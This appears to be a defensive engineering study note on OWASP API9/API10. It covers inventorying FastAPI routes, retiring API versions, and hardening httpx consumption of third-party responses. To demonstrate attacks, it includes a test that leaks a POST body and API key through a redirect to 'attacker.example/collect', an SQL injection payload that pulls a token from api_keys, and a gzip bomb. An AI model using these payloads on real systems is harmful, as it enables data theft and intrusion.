---
type: problem
track: [sde, distinguished]
level:
status: solid
last_reviewed:
sources:
  - "https://api-security.owasp.org/editions/2023/en/0xa9-improper-inventory-management"
  - "https://api-security.owasp.org/editions/2023/en/0xaa-unsafe-consumption-of-apis"
  - "https://raw.githubusercontent.com/OWASP/API-Security/master/editions/2023/en/0xa9-improper-inventory-management.md"
  - "https://raw.githubusercontent.com/OWASP/API-Security/master/editions/2023/en/0xaa-unsafe-consumption-of-apis.md"
  - "https://www.rfc-editor.org/rfc/rfc9745.html"
  - "https://www.rfc-editor.org/rfc/rfc8594.html"
  - "https://www.rfc-editor.org/rfc/rfc9727.html"
  - "https://www.rfc-editor.org/rfc/rfc9110.html"
  - "https://www.rfc-editor.org/rfc/rfc8259.html"
  - "https://www.rfc-editor.org/rfc/rfc7493.html"
  - "https://www.rfc-editor.org/rfc/rfc9651.html"
  - "https://www.python-httpx.org/advanced/timeouts/"
  - "https://raw.githubusercontent.com/standard-webhooks/standard-webhooks/main/spec/standard-webhooks.md"
  - "https://raw.githubusercontent.com/standard-webhooks/standard-webhooks/main/libraries/python/standardwebhooks/webhooks.py"
  - "https://docs.stripe.com/webhooks"
  - "https://github.com/advisories/GHSA-v845-jxx5-vc9f"
  - "https://github.com/advisories/GHSA-34jh-p97f-mpxf"
  - "https://github.com/advisories/GHSA-j8r2-6x86-q33q"
  - "https://github.com/advisories/GHSA-2xpw-w6gg-jr37"
  - "https://www.freecodecamp.org/news/responsible-disclosure-how-i-could-have-hacked-all-facebook-accounts-f47c0252ae4d/"
  - "https://sec.gov/Archives/edgar/data/1283699/000119312523010949/d641142d8k.htm"
  - "https://github.com/fastapi/fastapi/blob/0.136.3/fastapi/routing.py"
  - "https://github.com/fastapi/fastapi/blob/0.137.0/fastapi/routing.py"
  - "https://github.com/fastapi/fastapi/blob/0.137.2/fastapi/routing.py"
  - "https://github.com/encode/httpx/blob/0.28.1/httpx/_client.py"
  - "https://github.com/encode/httpx/blob/0.28.1/httpx/_models.py"
  - "https://github.com/encode/httpx/blob/0.28.1/httpx/_decoders.py"
  - "https://github.com/encode/httpcore/blob/1.0.9/httpcore/_async/http11.py"
  - "https://github.com/agronholm/anyio/blob/4.16.0/src/anyio/_core/_tasks.py"
  - "https://cwe.mitre.org/data/definitions/1059.html"
---

# Improper Inventory Management (API9:2023) and Unsafe Consumption of Third-Party APIs (API10:2023): Validating Untrusted Upstream Responses

> [!summary] Claim
> You cannot defend an endpoint you do not know you serve, and you cannot trust a partner you do not validate: compute the inventory from the live routing tree rather than from the docs, retire versions with `Deprecation`, `Sunset`, and `410`, and push every third-party response through one choke point that refuses redirects, caps decoded bytes, bounds total time, rejects ambiguous JSON, and validates into a typed model before any byte reaches SQL, a template, or arithmetic.

Part of [API Authorization and OWASP Security](README.md) in [API Engineering](../README.md).

## TL;DR

- Mechanism: API9 is a gap between what the router serves and what the organization believes it serves (hidden routes, mounted legacy apps, beta hosts), and API10 is a gap between what an upstream may send and what the consumer assumes it sends (redirects, bombs, trickles, duplicate keys, injection payloads).
- Contract rule: the inventory is derived from the routing tree and diffed against the OpenAPI document in CI, retired versions announce `Deprecation` (RFC 9745 Section 2.1) and `Sunset` (RFC 8594 Section 3) before answering `410 Gone`, and third-party data is validated with the same rigor as end-user input (OWASP API10:2023).
- Trap: in FastAPI 0.162.0 `app.routes` holds a private `_IncludedRouter` instead of `APIRoute` objects, so a naive `isinstance(r, APIRoute)` scan reports zero routes, and httpx 0.28.1 following a cross-origin `308` resends the `POST` body and any custom `X-Api-Key` header while stripping only `Authorization` (and `Cookie`, which it always drops).
- Portability: the HTTP rules (RFC 9110 Section 15.4) are version-independent across HTTP/1.1, HTTP/2, and HTTP/3; the variance lives in libraries (httpx header stripping, urllib3 decompression fixed in 2.6.0, pydantic-core accepting `NaN` and duplicate keys by default).
- When not to use it: a strict `extra="forbid"` upstream model and a hard cutover to `410` both break partners on harmless additive change; prefer `extra="ignore"` (RFC 7493 Section 4.2 Must-Ignore) and brownouts when the integration is long-lived and the upstream is contractually trusted.

## Mental model

```mermaid
flowchart LR
    subgraph API9[API9 inventory loop]
        R[Routing tree<br/>routers + mounts] --> D{Diff vs<br/>OpenAPI}
        S[OpenAPI document] --> D
        D -- undocumented --> SH[Shadow API:<br/>own it or delete it]
        D -- phantom --> ST[Stale docs:<br/>fix spec]
        R --> L[Lifecycle middleware<br/>Deprecation + Sunset]
        L -- after sunset --> G[410 Gone]
    end
    subgraph API10[API10 consumption choke point]
        U[Partner API] --> C1{https and<br/>host allowlisted?}
        C1 -- no --> X[Refuse before I/O]
        C1 --> C2{3xx?}
        C2 -- yes --> X2[Refuse, never<br/>follow Location]
        C2 --> C3{status 200 and<br/>JSON media type?}
        C3 --> C4{decoded bytes<br/>under cap and<br/>within deadline?}
        C4 --> C5{unique keys,<br/>no NaN, typed model?}
        C5 --> C6{answer matches<br/>the question?}
        C6 --> OK[Typed value to<br/>SQL params / math]
        C3 & C4 & C5 & C6 -. fail .-> E[502 or 504<br/>problem+json]
    end
```

The left loop treats the routing tree as the source of truth: a walker enumerates every operation the process will actually dispatch, including routes hidden from the schema and whole applications mounted under a prefix, and diffs that set against the OpenAPI document in both directions.
Anything served but undocumented is a shadow API that either gains an owner, a spec entry, and the same controls as production, or is deleted; anything documented but not served is stale documentation that misleads both clients and auditors.
The lifecycle middleware sits on the same tree and stamps retirement metadata on every response under a deprecated prefix, then switches to `410 Gone` when the sunset instant passes.
The right path is a single function every third-party read must traverse; each diamond is one condition from OWASP's API10 list, ordered so that the cheapest checks that need no network I/O run first and the ones that need the body run only after the body is bounded in bytes and time.
Every failure maps to a gateway status: `502 Bad Gateway` for an invalid upstream response (RFC 9110 Section 15.6.3) and `504 Gateway Timeout` for a late one (RFC 9110 Section 15.6.5), so the caller can tell "the partner is broken" from "we are broken".

## How it works

### What OWASP actually requires

OWASP rates API9:2023 exploitability Easy, prevalence Widespread, detectability Average, and technical impact Moderate, and names two blind spots: a documentation blind spot (the host's purpose, environment, audience, or running version is unclear, documentation is missing or stale, there is no retirement plan per version, or the host inventory is missing) and a data-flow blind spot (sensitive data flows to a third party without justification, approval, an inventory of the flow, or visibility into what is shared).
Its first scenario is a password-reset rate limit enforced in a separate component in front of the production API, absent on a beta host running the same API, which let a researcher brute-force the reset token and take over any account.
Its prevention list is inventory every host with environment, audience, and version; inventory every integrated service with its role, the data exchanged, and its sensitivity; document every aspect of the API (authentication, errors, redirects, rate limiting, CORS policy, and endpoints with their parameters, requests, and responses); generate documentation from open standards inside CI/CD; restrict documentation to authorized users; apply external protection to every exposed version, not only production; keep production data out of non-production, or give those deployments production-grade security when that is unavoidable; and, when a newer version adds security improvements, run a risk analysis that decides between backporting them and retiring the older version quickly.
OWASP rates API10:2023 exploitability Easy, prevalence Common, detectability Average, and technical impact Severe, and lists five conditions: talking to other APIs over an unencrypted channel, not validating or sanitizing their data before processing or passing it downstream, following redirects blindly, not limiting the resources used to process their responses, and not setting timeouts for the interaction.
Its root-cause sentence is that developers tend to "trust data received from third-party APIs more than user input", and its scenarios are a stored SQL injection planted in an address-enrichment service, a compromised partner answering a request carrying medical data with a `308 Permanent Redirect` to `https://attacker.com/`, and a repository named with an SQL payload that an integrating application concatenates into a query.
Its API10 prevention list is to assess a provider's API security posture before integrating, run every interaction over TLS, validate and sanitize integrated-API data before use, and keep an allowlist of well-known locations an integrated API may redirect to instead of following redirects blindly; the choke point below is stricter on the last point and refuses every `3xx`.
The mapped weaknesses are CWE-1059 (Incomplete Documentation) for API9 and CWE-20, CWE-200, and CWE-319 for API10.

### Inventory as a computed artifact

A hand-maintained spreadsheet drifts from the process the moment someone adds `include_in_schema=False` or `app.mount(...)`, so the inventory has to be computed from the same structure the router dispatches on.
FastAPI builds its OpenAPI document by walking route contexts and keeping only those whose original route is an `APIRoute` (fastapi 0.162.0 fastapi/openapi/utils.py, `_get_api_route_for_openapi`) and only those with `include_in_schema` true (fastapi 0.162.0 fastapi/openapi/utils.py, `get_openapi_path`), so a hidden route and every route of a mounted sub-application are served but never documented.
In FastAPI 0.162.0, `include_router` no longer copies `APIRoute` objects into the parent; it appends a private `_IncludedRouter` that resolves its effective routes lazily (fastapi 0.162.0 fastapi/routing.py, `_IncludedRouter` and `APIRouter.include_router`), which the lab proves breaks the classic `[r for r in app.routes if isinstance(r, APIRoute)]` scan: it returns an empty set.
The change landed in FastAPI 0.137.0: in 0.136.3 `include_router` still copied each route into the parent through `add_api_route`, and 0.137.0 is the first tag that defines `_IncludedRouter` and appends it (fastapi 0.136.3 and 0.137.0 fastapi/routing.py, `APIRouter.include_router`, read at the GitHub tags).
The public walker is `fastapi.routing.iter_route_contexts`, which yields one `RouteContext` per effective route with `path_format` and `methods` already combined with router prefixes (fastapi 0.162.0 fastapi/routing.py, `iter_route_contexts` and `RouteContext`); it first appears in 0.137.2, so on 0.137.0 and 0.137.1 only the private `_iter_routes_with_context` exists and the lab's walker does not import (fastapi 0.137.1 and 0.137.2 fastapi/routing.py, read at the GitHub tags).
A Starlette `Mount` exposes its child application's routes through `Mount.routes`, which returns `getattr(self._base_app, "routes", [])`, and stores its prefix with the trailing slash stripped (starlette 1.10.0 starlette/routing.py, `Mount.__init__` and `Mount.routes`), so the walker recurses with the prefix concatenated.
The lab's drift report on a two-version app finds ten undocumented operations: the four documentation routes of the parent, the hidden `/v2/debug/config`, and the mounted v1 application's own `/v1/docs`, `/v1/docs/oauth2-redirect`, `/v1/openapi.json`, `/v1/redoc`, and `/v1/orders/{order_id}`.
The last point is the one teams miss: a mounted legacy FastAPI application publishes its own interactive documentation and its own OpenAPI document, so the version you believe you hid advertises its complete attack surface at a URL that the parent's spec never mentions.
The inverse drift, a phantom operation documented but not served, is stale documentation; it is less dangerous but it erodes trust in the spec as the inventory and hides the fact that someone deleted an endpoint without a deprecation window.
The routing-tree walk only sees one process; hosts the process never knew about, such as the beta host in OWASP scenario 1, need a host inventory sourced from DNS zones, load-balancer configuration, and certificate issuance, and RFC 9727 gives that inventory a standard publication point.

### Publishing the inventory: RFC 9727 `api-catalog`

RFC 9727 (June 2025, Standards Track) defines the well-known URI `/.well-known/api-catalog` and the `api-catalog` link relation (RFC 9727 Sections 2 and 3) and registers both with IANA (RFC 9727 Section 7).
A `GET` on the well-known URI returns the catalog document and a `HEAD` returns a `Link` header with the `api-catalog` relation (RFC 9727 Section 2).
The document is an `application/linkset+json` Linkset, SHOULD carry the profile `https://www.rfc-editor.org/info/rfc9727`, MUST link each API endpoint, and is recommended to link usage policy, version information, and the OpenAPI description (RFC 9727 Sections 4.1 and 4.2).
Catalogs can nest through the `api-catalog` relation to split a large estate by domain (RFC 9727 Section 4.3), and the security considerations tell publishers to audit public catalogs so they do not reveal internal APIs, to rate-limit them, and to keep them current so obsolete "zombie" APIs can be found and decommissioned (RFC 9727 Section 8).
The catalog is the external face of the inventory; it does not discover shadow APIs on its own, so the computed diff above stays the enforcement mechanism and the catalog is generated from it.

### Retiring versions on the wire: `Deprecation`, `Sunset`, and `410`

`Deprecation` is an RFC 9651 Item Structured Field whose value MUST be a Date (RFC 9745 Section 2.1), serialized as `@` followed by integer epoch seconds (RFC 9651 Section 3.3.7), for example `Deprecation: @1688169599` for 2023-06-30T23:59:59Z.
The date may be in the past or the future, a `Link` with `rel="deprecation"` points to human-readable deprecation information (RFC 9745 Section 3), and deprecation itself "does not change any behavior of the resource" (RFC 9745 Section 5).
`Sunset` carries one HTTP-date (RFC 8594 Section 3), which is the IMF-fixdate form `Thu, 31 Dec 2026 23:59:59 GMT` (RFC 9110 Section 5.6.7), and RFC 8594 is Informational, not Standards Track.
RFC 8594 says a past timestamp should be read as "now", treats the value as a hint rather than a guarantee (Sections 3 and 8), scopes it by default to the resource that returned it (Section 5), and defines a `sunset` link relation for retirement policy (Section 6).
When both appear, the `Sunset` timestamp MUST NOT be earlier than the `Deprecation` timestamp (RFC 9745 Section 4); the lab's `ApiVersion` raises `ValueError` at construction rather than emitting the contradiction.
Neither RFC mandates what happens after sunset; RFC 8594 Section 9 offers `410 Gone` or `404 Not Found`, and RFC 9110 Section 15.5.11 defines `410` as "no longer available at the origin server" and "likely to be permanent", which is precisely what a retired version is.
The lab's `LifecycleMiddleware` is pure ASGI so it wraps any framework: before sunset it appends `Deprecation`, `Sunset`, and two `Link` fields to `http.response.start`; after sunset it answers `410` with `application/problem+json` without calling the application.
The prefix match is `path == prefix or path.startswith(prefix + "/")`, and the lab checks that `/v10/x` is not mistaken for `/v1`.

### Redirects: what RFC 9110 asks and what httpx does

RFC 9110 Section 15.4 lets a user agent follow `Location` automatically but warns that it "needs to be done with care for methods not known to be safe", tells it to remove resource-specific fields including `Authorization` and `Cookie`, and asks it to "consider removing" fields added by the calling context "where there are security implications".
`307` and `308` forbid changing the method (RFC 9110 Sections 15.4.8 and 15.4.9), so an automatic `308` replays a `POST` with its body to the new URI; `301` and `302` allow the historical `POST` to `GET` rewrite (RFC 9110 Sections 15.4.2 and 15.4.3).
httpx 0.28.1 defaults `follow_redirects=False` and `max_redirects=20` (httpx 0.28.1 httpx/_client.py, `AsyncClient.__init__`; httpx/_config.py, `DEFAULT_MAX_REDIRECTS`).
When following, it rewrites `302` and non-`HEAD` `303` to `GET` and `301` `POST` to `GET` (httpx 0.28.1 httpx/_client.py, `BaseClient._redirect_method`), keeps the request stream unless the method changed (`BaseClient._redirect_stream`), and in `BaseClient._redirect_headers` drops `Authorization` only when the new URL is a different origin that is not a plain `http` to `https` upgrade, always drops `Cookie` so the cookie jar decides, rewrites `Host` for a new origin, drops `Content-Length` and `Transfer-Encoding` only when the method changed to `GET`, and leaves every other header in place.
The lab proves the consequence: a cross-origin `308` from the partner to `attacker.example` delivers the original `POST`, the full JSON body, and the custom `x-api-key` header, while only `authorization` is removed.
That is OWASP's medical-records scenario reproduced with a mainstream client, and it is why the choke point passes `follow_redirects=False` explicitly and treats any `3xx` as a failure instead of trusting a client-wide default someone may flip.
If a partner genuinely moves, the new origin goes into the allowlist through code review; redirects are configuration changes, not runtime decisions.

### Bounding bytes: `Content-Length` measures the encoded body

`Content-Length` is the octet length of the content as transferred (RFC 9110 Section 8.6), and `Content-Encoding` names codings the recipient must undo to obtain the media type (RFC 9110 Section 8.4), so a `Content-Length` check bounds the compressed bytes only.
httpx decodes inside `Response.aiter_bytes` using a decoder chosen from `Content-Encoding`, looked up in `SUPPORTED_DECODERS` and stacked with `MultiDecoder` when several codings apply (httpx 0.28.1 httpx/_decoders.py, `SUPPORTED_DECODERS` and `MultiDecoder`), and an unknown coding is silently skipped by `except KeyError: continue`, so its bytes pass through undecoded (httpx 0.28.1 httpx/_models.py, `Response._get_content_decoder`).
`GZipDecoder.decode` calls `self.decompressor.decompress(data)` on a `zlib.decompressobj(zlib.MAX_WBITS | 16)` with no `max_length` (httpx 0.28.1 httpx/_decoders.py, `GZipDecoder.decode`), so one raw chunk expands completely before the caller sees it; a byte cap checked per decoded chunk bounds total memory to roughly the cap plus one chunk's expansion, not to the cap.
The lab's bomb is 8192 bytes on the wire and 8388619 bytes decoded, so it passes a 64 KiB `Content-Length` check, the naive `client.get(...).json()` path materializes all 8 MiB, and the choke point stops with `too_large` before any JSON parsing.
The cap does not prevent the allocation in the lab: `MockTransport` hands the 8192 bytes over as one chunk, so the choke point's first decoded chunk is already 8388619 bytes (measured during verification by streaming the same bomb through `aiter_bytes` on CPython 3.14.6, macOS 27.3 arm64).
Over a real HTTP/1.1 connection httpcore reads at most 64 KiB per network read (httpcore 1.0.9 httpcore/_async/http11.py, `AsyncHTTP11Connection.READ_NUM_BYTES = 64 * 1024`), so at the lab's ratio of about 1024:1 one read can still expand to about 64 MiB; a hard bound needs `Accept-Encoding: identity` with any other `Content-Encoding` refused, or decoding `aiter_raw` yourself with `zlib.decompressobj().decompress(data, max_length)`.
urllib3 shipped the same pattern as a vulnerability: before 2.6.0 its streaming API could fully decode a small amount of highly compressed data in one operation even when the caller requested a small chunk, tracked as CVE-2025-66471 (GHSA-2xpw-w6gg-jr37, CVSS v4 8.9, CWE-409); 2.6.0 avoids decompressing data beyond the requested amount.

### Bounding time: per-read timeouts are not a deadline

httpx's default is 5 seconds for each of connect, read, write, and pool, and the read timeout is "maximum duration to wait for a chunk of data to be received" (httpx timeouts documentation; httpx 0.28.1 httpx/_config.py, `DEFAULT_TIMEOUT_CONFIG`).
An upstream that sends one byte every 4 seconds never trips a 5 second read timeout and can hold a worker indefinitely; whitespace between JSON tokens is legal (RFC 8259 Section 2), so a trickle can even stay syntactically valid.
The choke point wraps the whole exchange in `anyio.fail_after`, which computes an absolute deadline and delegates to `fail_at`, whose cancel scope raises the built-in `TimeoutError` when the deadline passes (anyio 4.16.0 anyio/_core/_tasks.py, `fail_after` and `fail_at`), and the lab proves a 20 ms trickle is cut off by a 200 ms total deadline.
The deadline should be derived from the inbound request's own remaining budget; the propagation mechanics belong to [[Timeout-Taxonomy-Connect-Read-Write-Pool-and-Deadline-Propagation]].

### Parsing: the JSON your parser accepts is wider than the JSON you meant

RFC 8259 Section 4 says object names SHOULD be unique and that with duplicates "the behavior of software that receives such an object is unpredictable", and RFC 7493 Section 2.3 (I-JSON) makes duplicates a MUST NOT.
Both pydantic-core 2.50.4 and CPython `json.loads` keep the last duplicate, so `{"unit_price_cents": 250, ..., "unit_price_cents": 1}` validates to `1`, which is a parser-differential vector whenever another component (a WAF, a signature check, an audit log) reads the first value.
pydantic accepts `NaN` and `Infinity` for `float` fields unless the model sets `allow_inf_nan=False`, and CPython `json.loads` accepts them unless `parse_constant` rejects them; neither is JSON under RFC 8259 Section 6.
pydantic-core parses with a nesting limit: the lab measures 201 nested arrays accepted and 202 rejected with `recursion limit exceeded`, while CPython `json.loads` raises `RecursionError` (not `ValueError`) on very deep input, so a consumer that catches only `ValueError` crashes.
Numbers have two independent ceilings: I-JSON senders cannot expect integers beyond `2**53 - 1` (`9007199254740991`) to be exact (RFC 7493 Section 2.2), and CPython refuses to convert integer strings longer than 4300 digits (the `sys.set_int_max_str_digits` limit named in the error text), a limit `json.loads` inherits.
The choke point therefore validates with pydantic first (jiter bounds nesting before the stdlib parser sees the bytes) and then re-parses with `object_pairs_hook` and `parse_constant` hooks to reject duplicates and non-JSON constants, catching `ValueError` and `RecursionError`; the double parse is bounded by the byte cap.

### Validation is not sanitization

A typed model guarantees shape, not harmlessness: `"x'), (666, (SELECT token FROM api_keys))--"` is a perfectly valid 200-character `street`, and the lab shows it exfiltrating an API token through a string-built `INSERT` while the same validated value stored through a parameterized `INSERT` lands as inert text.
The controls are layered: the model bounds type, length, and pattern where the domain allows one (a SKU can be `^[A-Z0-9-]{1,32}$`, a street cannot exclude apostrophes); parameterization neutralizes the value for SQL (see [[SQL-Injection-NoSQL-Injection-and-Order-By-Identifier-Escaping]]); and output encoding neutralizes it for HTML or logs.
Unknown fields are a second trap: pydantic's default `extra="ignore"` drops them from the validated object, which is safe as long as the raw dict is never forwarded, while passing `response.json()` straight into an ORM constructor turns a partner's added `is_admin` field into mass assignment (see [[Defeating-BOPLA-and-Mass-Assignment-API3-2023-Strict-Input-Output-Schemas]]).
Finally, a valid answer can still be the wrong answer: the quote endpoint checks that the returned `sku` equals the requested one, because a confused or cache-poisoned upstream that answers a different question passes every schema check.

### Inbound pushes: verifying webhooks

Webhooks invert the direction but not the trust problem: the "upstream" calls you, and an unauthenticated endpoint accepts forged events.
Standard Webhooks signs `msg_id.timestamp.payload` with HMAC-SHA256, encodes it in base64, and sends it as `v1,<signature>` in `webhook-signature`, with `webhook-id` and `webhook-timestamp` beside it; several space-separated signatures allow zero-downtime key rotation, and verifiers must compare in constant time (Standard Webhooks specification).
The reference Python library rejects timestamps more than 5 minutes in either direction (standard-webhooks main branch libraries/python/standardwebhooks/webhooks.py, `Webhook.__verify_timestamp`, as of 2026-11), Stripe's libraries default to the same 5 minutes and warn that a tolerance of `0` disables the recency check entirely, and both tell consumers to deduplicate on the event or message id because deliveries repeat (Standard Webhooks specification; Stripe webhooks documentation).
The lab's `WebhookVerifier` checks the signature first, then the 300 second window (inclusive), then records the id to refuse replays, and accepts either of two active keys.
Consumer-side queueing, ordering, and idempotency are covered in [[Webhook-Consumer-Engineering-Signature-Verification-Replay-Windows-and-Idempotency]].

## Numbers and limits

| Quantity | Value | Source |
|---|---|---|
| OWASP API9:2023 ratings | Exploitability Easy, prevalence Widespread, detectability Average, impact Moderate | OWASP API Security Top 10 2023, API9 (as of 2026-11) |
| OWASP API10:2023 ratings | Exploitability Easy, prevalence Common, detectability Average, impact Severe | OWASP API Security Top 10 2023, API10 (as of 2026-11) |
| httpx default timeout | 5.0 s each for connect, read, write, pool; per operation, not total | httpx 0.28.1 httpx/_config.py, `DEFAULT_TIMEOUT_CONFIG`; httpx timeouts documentation |
| httpx redirect defaults | `follow_redirects=False`, `max_redirects=20` | httpx 0.28.1 httpx/_client.py and httpx/_config.py, `DEFAULT_MAX_REDIRECTS` |
| Historical redirect cap | 5, recommended by RFC 2068, no longer normative | RFC 9110 Section 15.4 note |
| Lab gzip bomb | 8192 bytes on the wire -> 8388619 bytes decoded (about 1024:1), delivered by `aiter_bytes` as one 8388619-byte chunk | Lab, `gzip.compress(..., compresslevel=9)`, CPython 3.14.6, macOS 27.3 arm64; chunk size from a verification probe on the same machine |
| httpcore HTTP/1.1 read size | 65536 bytes per network read | httpcore 1.0.9 httpcore/_async/http11.py, `AsyncHTTP11Connection.READ_NUM_BYTES` |
| Lab byte cap | 65536 decoded bytes (`UpstreamPolicy.max_body_bytes`) | Lab design choice; Standard Webhooks suggests payloads "usually smaller than 20kb" |
| pydantic-core JSON nesting | 201 levels accepted, 202 rejected | Lab test `test_parser_facts_pinned_pydantic_core_2_50_4`, pydantic-core 2.50.4 |
| CPython integer string limit | 4300 digits | `json.loads` of a 5000-digit integer on CPython 3.14.6, macOS 27.3 arm64: `Exceeds the limit (4300 digits) for integer string conversion` |
| I-JSON exact integer range | `[-(2**53)+1, (2**53)-1]`, that is `9007199254740991` | RFC 7493 Section 2.2 |
| Webhook timestamp tolerance | 300 s both directions | standard-webhooks Python library; Stripe documentation (as of 2026-11) |
| Standard Webhooks secret size | 24 to 64 bytes | Standard Webhooks specification |
| Stripe live-mode retries | Up to three days with exponential backoff | Stripe webhooks documentation (as of 2026-11) |
| Facebook beta host reset code | 6 digits = 1,000,000 values; `www` blocked after 10 to 12 attempts, beta hosts unlimited | Researcher write-up (reported 2016-02-22; freeCodeCamp republication 2018-02-09) |
| T-Mobile API exposure | About 37 million accounts, first retrieval on or around 2022-11-25, identified 2023-01-05 | T-Mobile Form 8-K, date of report 2023-01-19 |
| Lab run time | 24 tests in 0.80 s | Lab, one run during verification, CPython 3.14.6, macOS 27.3 arm64 |

## Portability

| Dimension | Result | Evidence |
|---|---|---|
| CPython 3.14.6 (workspace `.venv`) | 24 passed | Lab run, macOS 27.3 arm64, 2026-11-15 |
| CPython 3.12.16, 3.13.18, 3.14.10, 3.15.2 | Not run: lab checks paused on 2026-11-11, one run only | The module needs 3.12+ for PEP 695 `def f[M: BaseModel]` syntax (PEP 695) and 3.11+ for `datetime.UTC` and `enum.StrEnum`; otherwise pure Python |
| CPython 3.15.2t free-threaded | Not run | `WebhookVerifier.seen_ids` is a plain `set` mutated per call; under free threading a shared verifier needs a lock or an external store, which a production replay cache is anyway |
| FastAPI 0.162.0 | `app.routes` contains `_IncludedRouter`; naive `APIRoute` scan returns nothing; `iter_route_contexts` works | Lab test plus fastapi/routing.py |
| FastAPI 0.136.3 and earlier | `include_router` copies routes through `add_api_route`, so the naive `APIRoute` scan works; `iter_route_contexts` does not exist | fastapi/routing.py at tag 0.136.3 (source read, not run) |
| FastAPI 0.137.0 and 0.137.1 | `_IncludedRouter` present, so the naive scan returns nothing, but only the private `_iter_routes_with_context` exists and the lab walker does not import | fastapi/routing.py at tags 0.137.0 and 0.137.1 (source read, not run) |
| FastAPI 0.137.2 and later | `iter_route_contexts` public | fastapi/routing.py at tag 0.137.2 (source read, not run) |
| Starlette 1.10.0 | `Mount.routes` exposes child routes; mounted FastAPI apps serve their own `/docs` and `/openapi.json` | Lab test plus starlette/routing.py |
| httpx 0.28.1 | Cross-origin `308` keeps method, body, and custom headers; strips `Authorization` and `Cookie` | Lab test plus httpx/_client.py, `_redirect_headers` |
| urllib3 | Cookie leak on cross-origin redirect fixed in 2.0.6 and 1.26.17 (CVE-2023-43804); `Proxy-Authorization` leak fixed in 2.2.2 and 1.26.19 (CVE-2024-37891); streaming decompression bomb fixed in 2.6.0 (CVE-2025-66471) | GitHub advisories |
| requests | `Proxy-Authorization` forwarded on redirect to HTTPS, fixed in 2.31.0 (CVE-2023-32681) | GHSA-j8r2-6x86-q33q |
| pydantic 2.14.3 / pydantic-core 2.50.4 | Duplicate keys: last wins; `NaN` accepted for `float` unless `allow_inf_nan=False`; nesting limit 201 | Lab tests |
| HTTP/1.1, HTTP/2, HTTP/3 | Redirect, `Content-Length`, `Content-Encoding`, `410`, `502`, `504` semantics are version-independent | RFC 9110 Sections 8.4, 8.6, 15.4, 15.5.11, 15.6.3, 15.6.5 |
| Uvicorn, Hypercorn, Granian | `LifecycleMiddleware` is pure ASGI and server-agnostic | ASGI contract; not exercised against each server in this lab |

## Worked example

The [implementation](../labs/src/api_labs/f15_api_authorization_and_owasp_security/upstream_trust.py) holds the inventory walker, the lifecycle middleware, the consumption choke point, the quote app that uses it, and the webhook verifier; the [test](../labs/tests/f15_api_authorization_and_owasp_security/test_improper_inventory_management_api9_2023_and_unsafe_consumption_of_apis_api10_2023.py) holds 24 in-process tests.

The inventory walker, byte-identical to the lab:

```python
def served_operations(routes: Sequence[BaseRoute], prefix: str = "") -> frozenset[Operation]:
    """Walk the routing tree the way the router does: included routers and mounts too."""
    found: set[Operation] = set()
    for context in iter_route_contexts(routes):
        route = context.original_route
        if isinstance(route, Mount):
            found |= served_operations(route.routes, prefix + route.path)
            continue
        path, methods = context.path_format, context.methods
        if path is None or methods is None:  # WebSocket routes carry no HTTP methods
            continue
        found.update(Operation(m, prefix + path) for m in methods if m != "HEAD")
    return frozenset(found)
```

The consumption choke point, byte-identical to the lab:

```python
async def fetch_validated[M: BaseModel](
    client: httpx.AsyncClient, url: str, model: type[M], policy: UpstreamPolicy
) -> M:
    """The single choke point for third-party reads."""
    target = httpx.URL(url)
    if target.scheme != "https":
        raise UpstreamError(UpstreamFailure.INSECURE_URL, target.scheme)
    if target.host not in policy.allowed_hosts:
        raise UpstreamError(UpstreamFailure.HOST_NOT_ALLOWED, target.host)
    body = bytearray()
    try:
        with anyio.fail_after(policy.deadline_seconds):
            async with client.stream("GET", target, follow_redirects=False) as response:
                if 300 <= response.status_code < 400:
                    location = response.headers.get("location", "")
                    raise UpstreamError(UpstreamFailure.REDIRECT_REFUSED, location)
                if response.status_code != 200:
                    raise UpstreamError(UpstreamFailure.BAD_STATUS, str(response.status_code))
                media_type = response.headers.get("content-type", "").split(";")[0]
                media_type = media_type.strip().lower()
                if media_type != "application/json" and not media_type.endswith("+json"):
                    raise UpstreamError(UpstreamFailure.BAD_CONTENT_TYPE, media_type)
                declared = response.headers.get("content-length", "")
                if declared.isdigit() and int(declared) > policy.max_body_bytes:
                    raise UpstreamError(UpstreamFailure.TOO_LARGE, f"declared {declared}")
                async for chunk in response.aiter_bytes():  # decoded bytes
                    body += chunk
                    if len(body) > policy.max_body_bytes:
                        raise UpstreamError(UpstreamFailure.TOO_LARGE, f">{len(body) - 1}")
    except TimeoutError:
        raise UpstreamError(UpstreamFailure.DEADLINE, f"{policy.deadline_seconds}s") from None
    return decode_upstream(bytes(body), model)
```

The redirect test that pins the httpx 0.28.1 behavior, byte-identical to the lab:

```python
@pytest.mark.unit
@pytest.mark.asyncio
async def test_httpx_308_replays_body_and_custom_key_cross_origin_but_strips_authorization() -> (
    None
):
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        if request.url.host == "records.partner.example":
            return httpx.Response(308, headers={"location": "https://attacker.example/collect"})
        return httpx.Response(204)

    async with _client(handler) as client:
        await client.post(
            "https://records.partner.example/v1/records",
            json={"patient": "P-1", "diagnosis": "E11.9"},
            headers={"authorization": "Bearer EXAMPLE-NOT-A-REAL-TOKEN", "x-api-key": "k-EXAMPLE"},
            follow_redirects=True,
        )
    leaked = seen[1]
    assert (leaked.url.host, leaked.method) == ("attacker.example", "POST")
    assert json.loads(leaked.content) == {"patient": "P-1", "diagnosis": "E11.9"}
    assert leaked.headers["x-api-key"] == "k-EXAMPLE"
    assert "authorization" not in leaked.headers
```

The stored-injection test, as a simplified excerpt (table setup elided):

```python
payload = "x'), (666, (SELECT token FROM api_keys))--"
street = EnrichedAddress.model_validate_json(json.dumps({"street": payload})).street
store_address_naive(conn, 1, street)   # f-string INSERT: row for user 666 now holds the token
store_address_safe(conn, 1, street)    # parameterized INSERT: the payload is stored as text
```

Output captured on CPython 3.14.6, macOS 27.3 arm64, from `labs/` (the `-s` flag shows the bomb ratio the test prints):

```text
$ uv run --frozen pytest tests/f15_api_authorization_and_owasp_security/test_improper_inventory_management_api9_2023_and_unsafe_consumption_of_apis_api10_2023.py -q -s -p no:cacheprovider
..............
gzip bomb: 8192 bytes on the wire -> 8388619 decoded
..........
24 passed in 0.80s
```

